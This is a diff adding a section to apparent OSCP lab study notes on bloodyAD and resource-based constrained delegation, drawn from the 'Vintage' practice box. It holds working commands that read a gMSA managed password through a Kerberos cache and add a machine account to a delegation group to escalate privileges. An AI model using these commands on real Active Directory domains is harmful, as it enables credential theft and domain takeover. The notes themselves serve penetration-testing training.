@@ -56,6 +56,35 @@ The exact host option differs between releases. If `--host` is rejected, run `bl
 - Resolve the target FQDN locally before using the ccache. A valid Kerberos ticket does not repair missing DNS or `/etc/hosts` entries.
 - Remove the RBCD entry after the proof is captured and confirm the tool reports that the machine account is no longer trusted for delegation.
 
+## Vintage: Kerberos cache and group-based RBCD
+
+Vintage used `bloodyAD` for normal LDAP object changes through a ccache rather than an NTLM password:
+
+```bash
+KRB5_CONFIG=$BoxDir/notes/krb5.conf \
+KRB5CCNAME=$BoxDir/loot/gMSA01$.ccache \
+  bloodyAD -d $Domain -u 'gMSA01$' \
+  -k ccache=$BoxDir/loot/gMSA01$.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP get object 'gMSA01$' \
+  --attr msDS-ManagedPassword --raw
+```
+
+When a trusted RBCD group already exists on the target computer, add the controlled machine account to the group and verify it instead of writing the binary RBCD attribute directly:
+
+```bash
+bloodyAD -d $Domain -u $Username3 -k \
+  ccache=$BoxDir/loot/$Username3.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP \
+  add groupMember DelegatedAdmins 'FS01$'
+
+bloodyAD -d $Domain -u $Username3 -k \
+  ccache=$BoxDir/loot/$Username3.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP \
+  get object DelegatedAdmins --attr member
+```
+
+Renew the `FS01$` TGT after the membership change. Vintage's first `getST.py` attempts failed with `KDC_ERR_BADOPTION` until group membership, `tokenGroups`, and the machine ticket were all refreshed.
+
 #### Tags: #ModernTooling #BloodyAD #ActiveDirectory #RBCD #ACLAbuse #Kerberos #S4U #Delegation
 
 ## External Resources
@@ -74,3 +103,4 @@ BloodyAD speeds up a specific AD object-abuse operation without hiding the under
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- RBCD from a controlled member computer to the domain controller
+- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] -- gMSA object reads, ccache-backed group changes, and group-based RBCD with `FS01$`
